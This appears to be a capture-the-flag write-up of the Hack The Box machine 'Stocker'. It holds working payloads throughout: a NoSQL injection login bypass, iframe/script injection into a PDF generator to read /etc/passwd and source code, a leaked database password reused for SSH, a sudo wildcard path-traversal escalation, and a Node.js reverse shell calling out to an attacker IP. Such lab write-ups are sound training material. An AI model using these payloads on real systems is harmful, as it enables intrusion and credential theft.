# stocker

Nothing exiting from nmap; just the standard 22 and 80.

The website didn't show anything interesting, so I started looking for subdomains and found this:

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                  
=====================================================================

000000019:   302        0 L      4 W        28 Ch       "dev"                                    
```

The dev site by itself was also not interesting, but I did find a log in page:

http://dev.stocker.htb/login

I tried running sqlmap to see if anything is injectible, but doesn't look like it.

Wappalyzer told me it's running express, and I had just watched IppSec's video on Shoppy which also features an Express site with authentication and a nosql injection, so I got that down pretty fast.

Converted the request to `application/json` and quickly found the following payload working:

```
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 55
Content-Type: application/json
Accept: text/html

{"username": {"$ne": null}, "password": {"$ne": null} }
```

As curl:

```
curl -i -s -k -X $'POST' \
    -H $'Host: dev.stocker.htb' -H $'Content-Length: 55' -H $'Content-Type: application/json' -H $'Accept: text/html' \
    --data-binary $'{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null} }' \
    $'http://dev.stocker.htb/login'
```

At this point I started struggling. My gut told me that the area to focus on must be something to do with user input since I had nothing else like numbers etc, but I had no idea.

In the end I was hinted towards XSS for PDF. I used this payload in the end:

```
<iframe src=file:///etc/passwd width=1000px height=1000px></iframe>
```

In the `title` field for a basket item when submitting an order:

```
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<iframe src=file:///etc/passwd width=1000px height=1000px></iframe>",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 1
    }
  ]
}
```
(More or less copied from: https://exploit-notes.hdks.org/exploit/web/security-risk/xss-with-dynamic-pdf/)

And on this output I could see which users had a shell:

```
root:x:0:0:root:/root:/bin/bash
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
```

And with this payload I could see the current working directory:

```
<img src='x' onerror="document.write(JSON.stringify(window.location))">
<script>document.write('<iframe src=\"' + window.location.href + '\"></iframe>')</script>
```

And in the contents of index.js, the following mongodb credentials could be seen:

```
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

So naturally I try the password for angoose user and ssh:

```
$ssh angoose@stocker.htb
```

And foothold!

# Privilege escalation

One of the first things I do is always `sudo -l`:

```
$ sudo -l
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

I did not have any write access to /usr/local/scripts/, so instead I went looking for some already-existing .js file that may give me something. There were some files called `repl.js` etc, so I thought that might a good candidate, but in the end nothing worked.

So I googled a bit and while googling, it dawned on me that perhaps the asterisk will allow `.` and `/` as well?

I created a small test file:

```
$ mkdir /tmp/nscp
$ echo "console.log('foo'):" > /tmp/nscp/foo.js
$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/nscp/foo.js
foo
```

It works! Then I went searching for some node.js to read files:

```
const { exec } = require("child_process");

exec("ls -la /root/", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
```

Also works!

At this point, I had a I needed and could simply `cat /root/root.txt`, but it's more fun to have a proper shell:

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.16.19", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

Done! The system can consider itself owned!

# Conclusion

I had a difficult time trying to find out what to do after the authentication bypass and had to rely heavily on hints - I had no idea you could show html and javascript in a PDF!
